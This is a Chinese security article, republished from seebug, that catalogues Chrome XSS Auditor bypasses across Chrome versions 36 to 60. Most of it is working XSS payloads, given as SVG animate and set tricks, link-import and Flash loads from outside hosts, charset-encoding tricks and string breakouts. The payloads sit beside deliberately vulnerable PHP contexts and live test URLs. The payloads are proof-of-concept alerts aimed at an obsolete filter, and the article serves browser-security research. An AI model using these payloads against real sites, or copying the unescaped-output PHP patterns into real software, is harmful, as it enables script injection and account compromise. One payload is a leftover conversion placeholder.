@@ -1,0 +1,411 @@
+# 【技术分享】浏览器安全 / Chrome XSS Auditor bypass
+
+阅读量 **141481**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-08-15 14:01:15
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：seebug.org
+
+原文地址：<http://paper.seebug.org/376/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+**作者：[ phith0n](http://weibo.com/101yx)@长亭科技**
+
+**  
+**
+
+**Universal Bypass 5**
+
+****
+
+**最新版 Chrome 60**
+
+context = null
+
+test
+
+<http://mhz.pw/game/xss/xss.php?xss=%3c%62%72%3e%00%00%00%00%00%00%00%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e>
+
+**Bypass 4 （需交互的bypass）**
+
+****
+
+**chrome 60**
+
+    
+    
+    ?c=<svg><animate href=#x attributeName=href values=　javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+    // or
+    ?c=<svg width=10000px height=10000px><a><rect width=10000px height=10000px z-index=9999999 /><animate attributeName=href values=javas&#99ript:alert(1)>
+
+test
+
+[http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Canimate%20href%3D%23x%20attributeName%3Dhref%20values%3D%26%23×3000%3Bjavascript%3Aalert%281%29%20%2F%3E%3Ca%20id%3Dx%3E%3Crect%20width%3D100%20height%3D100%20%2F%3E%3C%2Fa%3E](http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Canimate%20href%3D%23x%20attributeName%3Dhref%20values%3D%26%23x3000%3Bjavascript%3Aalert%281%29%20%2F%3E%3Ca%20id%3Dx%3E%3Crect%20width%3D100%20height%3D100%20%2F%3E%3C%2Fa%3E)
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Csvg%20width%3D10000px%20height%3D10000px%3E%3Ca%3E%3Crect%20width%3D10000px%20height%3D10000px%20z-index%3D9999999%20%2F%3E%3Canimate%20attributeName%3Dhref%20values%3Djavas%26%2399ript%3Aalert%281%29%3E>
+
+**Bypass 3 via flash**
+
+**只要支持flash的chrome版本（到Chrome 56），均可使用。**
+
+**context = support flash**
+
+    
+    
+    <object allowscriptaccess=always> <param name=url value=http://mhz.pw/game/xss/alert.swf>
+
+test
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=http%3A%2F%2Fmhz.pw%2Fgame%2Fxss%2Falert.swf%3E>
+
+  
+
+**Universal Bypass 2**
+
+****
+
+**到Chrome 55/56可用， 无任何条件，只要输出在页面中即可执行代码。**
+
+**context = null**
+
+    
+    
+    ?xss=<svg><set href=#script attributeName=href to=data:,alert(document.domain) /><script id=script src=foo></script>
+
+test
+
+    
+    
+    http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cset%20href%3D%23script%20attributeName%3Dhref%20to%3Ddata%3A%2Calert(document.domain)%20%2F%3E%3Cscript%20id%3Dscript%20src%3Dfoo%3E%3C%2Fscript%3E
+
+**Universal Bypass 1**
+
+****
+
+**到Chrome 55/56可用，无任何条件，只要输出在页面中即可执行代码。**
+
+**context = null**
+
+    
+    
+    ?xss=<link rel="import" href="https:www.leavesongs.com/testxss"
+
+test
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3D%22import%22%20href%3D%22https%3Awww.leavesongs.com%2Ftestxss%22>
+
+**Chrome 59 && 输出点后面有空格的情况**
+
+****
+
+**context:**
+
+    
+    
+    <?php  
+    header('X-XSS-Protection: 1; mode=block');  
+    echo "<!DOCTYPE html><html><head></head><body>{$_GET['html']} </body></html>";
+
+test
+
+<http://mhz.pw/game/xss/xss2.php?html=%3Cscript%3Ealert%28%29%3C/script>
+
+**Chrome 44/45 + 属性中输出的情况**
+
+****
+
+<https://code.google.com/p/chromium/issues/detail?id=526104>
+
+**chrome 45+ fixed**
+
+****
+
+**context:**
+
+    
+    
+    <html>  
+     <head>
+      <title>XSSAuditor bypass</title>
+     </head>
+    <body>  
+        <form>
+        <input type="text" value="<?php echo isset($_GET['input']) ? $_GET['input'] : 'use ?input=foo'?>">
+        </form>
+    </body>  
+    </html>
+
+**payload：**
+
+    
+    
+    "><script>prompt(/XSS/);1%02<script</script>
+
+test
+
+<http://mhz.pw/game/xss/attr.php?xss=%22%3E%3Cscript%3Eprompt(%2FXSS%2F)%3B1%2502%3Cscript%3C%2Fscript%3E>
+
+**无charset Bypass**
+
+****
+
+没有输出charset的情况下，可以通过制定字符集来绕过auditor。
+
+老版的这个编码：ISO-2022-KR，可用 **onerror%0f=alert(1)**
+bypass，但现在版本已经没用这个编码，所以该payload只适用于老版本chrome。
+
+新版中，有这个编码：ISO-2022-JP，可以在关键处中加入 **%1B%28B** ，会被省略。
+
+context:
+
+    
+    
+    <?php  
+    echo $_GET['xss'];
+
+payload:
+
+老版：
+
+    
+    
+    xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%0f=alert(1)%3E
+
+新版：
+
+    
+    
+    xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E
+
+test:
+
+<http://mhz.pw/game/xss/charset.php?xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E>
+
+输出在属性中，并且后面还有<script>的情况
+
+context:
+
+    
+    
+    <!doctype HTML>  
+    <img alt="<?php echo $_GET['xss']; ?>">  
+    <script> y = "abc"; </script>
+
+payload
+
+    
+    
+    {gfm-js-extract-pre-1}
+
+test
+
+<http://mhz.pw/game/xss/beforescript.php?xss=%22%3E%3Cscript%2Fsrc%3Ddata%3A%2Calert(document.domain)%2B%22>
+
+**双输出点的情况**
+
+****
+
+context:
+
+    
+    
+    <?php  
+    // Echo the value of parameter one 
+    echo "This is text1:".$_GET['text1']."<br><br>";  
+    // Echo the value of parameter two 
+    echo "This is text2:".$_GET['text2']."<br><br>";  
+    ?>
+
+payload:
+
+    
+    
+    http://xxx/chrome.php?text1=<script>alert(/XSS/);void('&text2=')</script>  
+    http://xxx/chrome.php?text1=<script>alert(/XSS/);document.write('&text2=')</script>
+
+test
+
+[http://mhz.pw/game/xss/doubleout.php?text1=%3Cscript%3Ealert(/XSS/);void(%27&text2=%27)%3C/script%3E](http://mhz.pw/game/xss/doubleout.php?text1=%3Cscript%3Ealert\(/XSS/\);void\(%27&text2=%27\)%3C/script%3E)
+
+**Chrome 43 XSSAuditor bypass**
+
+****
+
+**大概2015-06-23以前的版本均可。**
+
+**context = 全部情况**
+
+payload:
+
+    
+    
+    xss=<svg><script>/<1/>alert(document.domain)</script></svg>
+
+test
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cscript%3E/%3C1/%3Ealert(document.domain)%3C/script%3E%3C/svg%3E>
+
+**Chrome 36~40 link 导入html导致bypass**
+
+Fixed on Oct 10, 2014.（实际上15年初还存在）
+
+<https://code.google.com/p/chromium/issues/detail?id=421166>
+
+<http://www.wooyun.org/bugs/wooyun-2010-090304>
+
+由于link导入外部html导致XSSAuditor绕过。
+
+**context = 全部情况**
+
+payload
+
+    
+    
+    xss=<link rel=import href=https://auth.mhz.pw/game/xss/link.php>
+
+test
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3Dimport%20href%3Dhttps%3A%2F%2Fauth.mhz.pw%2Fgame%2Fxss%2Flink.php%3E>
+
+  
+
+**输出在script内字符串位置的情况**
+
+****
+
+如果允许闭合字符串，直接闭合并写入javascript即可，如:
+
+[http://mhz.pw/game/xss/scriptstr.php?xss=%27|alert(1)|%27](http://mhz.pw/game/xss/scriptstr.php?xss=%27%7Calert\(1\)%7C%27)
+
+但如果不能闭合单引号呢？如这个context
+
+    
+    
+    <!DOCTYPE html>  
+    <html>  
+    <head>  
+        <meta charset="utf-8">
+        <title>all</title>
+        <script type="text/javascript">
+        var a = '<?php echo addslashes($_GET["xss"]); ?>';
+        </script>
+    </head>  
+    <body>  
+    123  
+    </body>  
+    </html>
+
+payload
+
+    
+    
+    <script>  
+    x = "</script><svg><script>alert(1)+&quot;";
+    <script>  
+    x = "</script><svg><script>alert(1)+&apos;";
+
+test
+
+<http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)%2b%26apos%3B>
+
+<http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)//>
+
+**有可控上传点的通用Bypass**
+
+****
+
+context：
+
+网站域名下有可控的上传点，我可以上传一个.txt或.js等文件（只要不是媒体文件，其他文件均可，比如上传是黑名单验证的，可以随便写个后缀）。再引入script标签的src属性即可。
+
+payload
+
+    
+    
+    xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E
+
+test
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E>
+
+<http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.ayu%3E%3C/script%3E>
+
+**JSON Encode**
+
+****
+
+context
+
+    
+    
+    <?=json_encode($_GET['x'])?>
+
+payload
+
+    
+    
+    ?x=<img+src=x+onerror=`ö`-alert(1)>
+
+  
+
+**存在字符替换的情况**
+
+****
+
+当输出点在输出前存在字符（大部分字符，字符串什么的都可以）的替换，context如下：
+
+    
+    
+    <?php  
+    echo str_replace('"', '&quote;', $_REQUEST['name']);  
+    echo str_replace('&', '&amp;', $_REQUEST['name']);  
+    echo str_replace('\', '&bsol;', $_REQUEST['name']);  
+    echo str_replace('#', '&num;', $_REQUEST['name']);  
+    echo str_replace('xxxx', 'b', $_REQUEST['name']);
+
+既可以在payload里带入该字符进行绕过auditor：
+
+    
+    
+    xss=<script>'"'/alert(1)</script>
+
+test
+
+<http://mhz.pw/game/xss/amps.php?name=zx%3Cscript%3E%27%26%27/alert(1)%3C/script%3Eczxc>
+
+本文翻译自seebug.org [原文链接](http://paper.seebug.org/376/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **安全客** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/86625](/post/id/86625)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [seebug.org](http://paper.seebug.org/376/)
+
+如若转载,请注明出处： <http://paper.seebug.org/376/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
